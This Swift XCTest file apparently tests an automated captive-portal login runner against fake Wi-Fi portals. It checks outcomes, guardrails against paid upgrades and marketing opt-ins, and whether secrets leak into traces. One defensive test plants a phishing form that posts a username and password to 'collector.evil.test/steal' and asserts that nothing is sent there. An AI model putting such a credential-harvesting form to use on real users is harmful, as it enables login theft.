import Foundation
import XCTest
@testable import CaptiveCore

/// Phase 2: Replay ohne AI gegen alle Testportale (02 §21, §23; Gates S8, S10, S11, S12).
final class RecipeRunnerTests: XCTestCase {
    private var manifest: PortalManifest!

    override func setUpWithError() throws {
        manifest = try PortalManifest.load()
    }

    private var values: StaticValueProvider {
        let v = manifest.testValues
        return StaticValueProvider(
            keychain: [
                "corp.username": v["username"]!, "corp.password": v["password"]!,
                "hotel.lastName": v["lastName"]!, "hotspot.voucher": v["voucherCode"]!,
                "freewifi.email": v["email"]!,
            ],
            asked: [.roomNumber: v["roomNumber"]!]
        )
    }

    private func run(_ portal: FakePortal, recipe: Recipe, values: (any ValueProvider)? = nil) async -> RunResult {
        await RecipeRunner(transport: portal, values: values ?? self.values).run(recipe)
    }

    private func recipe(_ name: String) throws -> Recipe { try Fixtures.recipe("valid", name) }

    /// Fixture → (Recipe, erwartetes Outcome). Jede Fixture aus manifest.json muss hier stehen.
    private let table: [String: (recipe: String, outcome: RunOutcome)] = [
        "01_clickthrough": ("01_clickthrough", .success),
        "02_terms": ("02_terms", .success),
        "03_terms_privacy": ("03_terms_privacy", .success),
        "04_userpass": ("04_userpass", .success),
        "05_hotel": ("05_hotel", .success),
        "06_voucher": ("06_voucher", .success),
        "07_email": ("07_email", .success),
        "08_multistage_terms": ("08_09_multistage", .success),
        "09_multistage_guest": ("08_09_multistage", .success),
        "10_changed_labels": ("05_hotel", .recipeMismatch),
        "11_hidden_csrf": ("11_hidden_csrf", .success),
        "12_optional_marketing": ("12_optional_marketing", .success),
        "13_paid_upgrade": ("13_paid_upgrade", .success),
        "14_js_only": ("02_terms", .manualInteractionRequired),
        "15_malformed_html": ("15_malformed_html", .success),
        "16_icomera_form": ("16_icomera_form", .success),
        "17_icomera_cna": ("17_icomera_cna", .success),
        "18_hotsplots_uam": ("18_hotsplots_uam", .success),
        "19_meraki_clickthrough": ("19_meraki_clickthrough", .success),
    ]

    func testEveryFixtureHasExpectedOutcome() async throws {
        XCTAssertEqual(Set(table.keys), Set(manifest.fixtures.keys), "Tabelle und manifest.json laufen auseinander")
        for (fixture, expectation) in table.sorted(by: { $0.key < $1.key }) {
            let portal = FakePortal(portal: fixture, manifest: manifest)
            let result = await run(portal, recipe: try recipe(expectation.recipe))
            let online = await portal.state.online
            let rejections = await portal.state.rejections
            XCTAssertEqual(result.outcome, expectation.outcome,
                           "\(fixture): \(result.reason)\nPortal-Ablehnungen: \(rejections)\n\(dump(result.trace))")
            XCTAssertEqual(online, expectation.outcome == .success, "\(fixture): online-Zustand")
        }
    }

    func testChangedLabelIsReportedAsMismatchOnSubmitButton() async throws {
        let portal = FakePortal(portal: "10_changed_labels", manifest: manifest)
        let result = await run(portal, recipe: try recipe("05_hotel"))
        XCTAssertEqual(result.reason, .targetNotFound(stage: "guest", action: 2))
        XCTAssertEqual(result.failedStageId, "guest")
        XCTAssertEqual(result.failedActionIndex, 2)
        let posts = await portal.state.requests.filter { $0.method == "POST" }
        XCTAssertTrue(posts.isEmpty, "Bei Mismatch darf nichts abgeschickt werden")
    }

    func testAlreadyOnlineSkipsLogin() async throws {
        let portal = FakePortal(portal: "05_hotel", manifest: manifest)
        await portal.state.setOnline(true)
        let result = await run(portal, recipe: try recipe("05_hotel"))
        XCTAssertEqual(result.reason, .alreadyOnline)
        let requests = await portal.state.requests
        XCTAssertEqual(requests.count, 1)
    }

    func testMissingRoomNumberRequestsUserValue() async throws {
        let portal = FakePortal(portal: "05_hotel", manifest: manifest)
        var values = self.values
        values.asked = [:]
        let result = await run(portal, recipe: try recipe("05_hotel"), values: values)
        XCTAssertEqual(result.outcome, .missingUserValue)
        XCTAssertEqual(result.reason, .missingValue(.roomNumber))
        let posts = await portal.state.requests.filter { $0.method == "POST" }
        XCTAssertTrue(posts.isEmpty)
    }

    func testPreselectedNewsletterIsUncheckedAutomatically() async throws {
        let yaml = try Fixtures.recipeText("valid", "02_terms")
            .replacingOccurrences(of: "labelAny: [Terms, Nutzungsbedingungen]", with: "labelAny: [Accept required Terms]")
        let portal = FakePortal(portal: "12_optional_marketing", manifest: manifest)
        let result = await run(portal, recipe: try PRLCodec.decode(yaml: yaml))
        XCTAssertEqual(result.outcome, .success, "\(result.reason)")
        XCTAssertTrue(result.trace.events.contains { $0.kind == .guardrail })
    }

    func testPaidUpgradeButtonIsBlockedAtRuntime() async throws {
        // Am Validator vorbei, um die Runtime-Leitplanke allein zu prüfen.
        let yaml = try Fixtures.recipeText("valid", "13_paid_upgrade")
            .replacingOccurrences(of: "[Continue with free Wi-Fi]", with: "[Upgrade to Premium]")
        let portal = FakePortal(portal: "13_paid_upgrade", manifest: manifest)
        let result = await run(portal, recipe: try PRLCodec.decode(yaml: yaml))
        XCTAssertEqual(result.outcome, .manualInteractionRequired)
        guard case .commercialElement = result.reason else { return XCTFail("\(result.reason)") }
        let online = await portal.state.online
        XCTAssertFalse(online)
    }

    func testCredentialsAreNotSentToUntrustedHost() async throws {
        var portal = FakePortal(portal: "04_userpass", manifest: manifest)
        portal.extraPages["/phish"] = """
        <form method="post" action="http://collector.evil.test/steal">
          <input name="username"><input name="password" type="password"><button>Login</button>
        </form>
        """
        portal.entryURL = "http://portal.test/phish"
        let result = await run(portal, recipe: try recipe("04_userpass"))
        XCTAssertEqual(result.reason, .credentialHostNotTrusted("collector.evil.test"))
        let evil = await portal.state.requests.filter { $0.url.host == "collector.evil.test" }
        XCTAssertTrue(evil.isEmpty)
    }

    func testWrongPasswordIsTemporaryFailure() async throws {
        let portal = FakePortal(portal: "04_userpass", manifest: manifest)
        var values = self.values
        values.keychain["corp.password"] = "wrong-password"
        let result = await run(portal, recipe: try recipe("04_userpass"), values: values)
        XCTAssertEqual(result.reason, .httpStatus(400))
        XCTAssertEqual(result.outcome, .temporaryFailure)
    }

    func testMerakiGrantKeepsPortalQueryParameters() async throws {
        let portal = FakePortal(portal: "19_meraki_clickthrough", manifest: manifest)
        _ = await run(portal, recipe: try recipe("19_meraki_clickthrough"))
        let grants = await portal.state.requests.filter { $0.url.host == "n123.network-auth.com" }
        XCTAssertEqual(grants.count, 1)
        let query = FakePortal.query(grants[0].url)
        XCTAssertEqual(query["continue_url"], "http://example.com/")
        XCTAssertEqual(query["duration"], "3600")
    }

    func testMultistageVisitsBothStages() async throws {
        let portal = FakePortal(portal: "08_multistage_terms", manifest: manifest)
        let result = await run(portal, recipe: try recipe("08_09_multistage"))
        let stages = result.trace.events.filter { $0.kind == .stage }.compactMap(\.stageId)
        XCTAssertEqual(stages, ["terms", "guest"])
    }

    /// Gate S12: Keine Testwerte im Klartext im Trace (02 §18).
    func testTraceNeverContainsSecrets() async throws {
        var allMessages: [String] = []
        for (fixture, expectation) in table {
            let portal = FakePortal(portal: fixture, manifest: manifest)
            let result = await run(portal, recipe: try recipe(expectation.recipe))
            let data = try JSONEncoder().encode(result.trace)
            allMessages.append(String(decoding: data, as: UTF8.self))
        }
        let corpus = allMessages.joined(separator: "\n")
        for (key, secret) in manifest.testValues {
            let pattern = "\\b" + NSRegularExpression.escapedPattern(for: secret) + "\\b"
            let regex = try NSRegularExpression(pattern: pattern)
            let hits = regex.numberOfMatches(in: corpus, range: NSRange(corpus.startIndex..., in: corpus))
            XCTAssertEqual(hits, 0, "Testwert '\(key)' steht im Trace")
        }
        XCTAssertTrue(corpus.contains("<secret:hotel.lastName>"))
        XCTAssertTrue(corpus.contains("<runtime:roomNumber>"))
    }

    private func dump(_ trace: RunTrace) -> String {
        trace.events.map { "  [\($0.kind.rawValue)] \($0.message)" }.joined(separator: "\n")
    }
}
